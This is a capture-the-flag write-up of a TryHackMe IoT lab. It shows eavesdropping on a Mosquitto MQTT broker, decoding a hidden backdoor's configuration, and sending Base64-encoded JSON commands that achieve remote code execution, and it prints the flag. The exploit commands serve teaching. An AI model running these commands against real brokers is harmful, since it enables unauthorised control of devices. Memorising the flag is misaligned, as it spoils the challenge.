# TryHackMe - MQTT Backdoor Exploitation

**Machine Name:** MQTT Enumeration & Exploitation  
**Difficulty:** Easy / Medium  
**Category:** IoT / Networking / Command Injection  
**IP Address:** 10.80.166.204  

---

## Description
This challenge focuses on exploiting an insecure Internet of Things (IoT) environment running an MQTT broker (Mosquitto). The objective is to eavesdrop on network traffic to uncover a hidden, intermittently broadcasting backdoor, decode its communication protocol, and craft specific Base64-encoded JSON payloads to achieve Remote Code Execution (RCE) and retrieve the flag.

---

## Enumeration

### Port Scanning
I started with an `nmap` scan to enumerate open services:
```bash
nmap -p- -sV -sC -Pn --min-rate 1000 10.80.166.204
```

**Findings:**
* **Port 22 (SSH):** Open. Running OpenSSH 8.2p1.
* **Port 1883 (MQTT):** Open. Running `mosquitto version 2.0.14`. The Nmap script picked up standard `$SYS` telemetry and a few smart home devices (`patio/lights`, `kitchen/toaster`, `livingroom/speaker`, `storage/thermostat`), but no immediate vulnerabilities.

### MQTT Eavesdropping
Since Nmap only listens for a short window, I used `mosquitto_sub` with the `#` wildcard to subscribe to all topics on the broker and monitor the live traffic:
```bash
mosquitto_sub -h 10.80.166.204 -t "#" -v
```

Mixed in with the normal IoT device chatter, I spotted an anomalous topic broadcasting a Base64 encoded payload:
`yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI...`

---

## Exploitation: The MQTT Backdoor

### Analyzing the Blueprint
I decoded the Base64 string to reveal the configuration of a hidden backdoor:
```bash
echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==" | base64 -d
```

**Decoded JSON:**
```json
{
  "id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "registered_commands":["HELP","CMD","SYS"],
  "pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
  "sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
}
```

### Interacting with the Backdoor
I set up a listener terminal on the `pub_topic` to catch the backdoor's responses:
```bash
mosquitto_sub -h 10.80.166.204 -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"
```

In a second terminal, I sent a test `HELP` command to the `sub_topic`:
```bash
mosquitto_pub -h 10.80.166.204 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "HELP"
```

The listener caught a Base64 encoded error message. Decoding it (`echo "SW5..." | base64 -d`) revealed that the backdoor requires a strict JSON format packaged inside Base64:
`Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})`

### Achieving Remote Code Execution (RCE)
To list the files in the current directory (`ls -la`), I crafted a custom payload using terminal expansion to encode the JSON on the fly (using `-n` and `-w 0` to strip bad characters):

```bash
PAYLOAD=$(echo -n '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls -la"}' | base64 -w 0)
mosquitto_pub -h 10.80.166.204 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "$PAYLOAD"
```

Decoding the response showed a `flag.txt` file owned by root, but with global read permissions (`-rw-r--r--`). 

### Flag Retrieval
I swapped the argument in my payload to read the flag directly:
```bash
PAYLOAD=$(echo -n '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}' | base64 -w 0)
mosquitto_pub -h 10.80.166.204 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "$PAYLOAD"
```

**Decoded Response:**
```json
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{18d44fc0707ac8dc8be45bb83db54013}\n"}
```

---

## Conclusion
This lab demonstrates the severe risk of unauthenticated command injection backdoors in IoT environments. Because MQTT acts as an open message broker, anyone on the network can eavesdrop on configuration data using wildcards and inject malicious commands to seize control of the underlying host operating system.
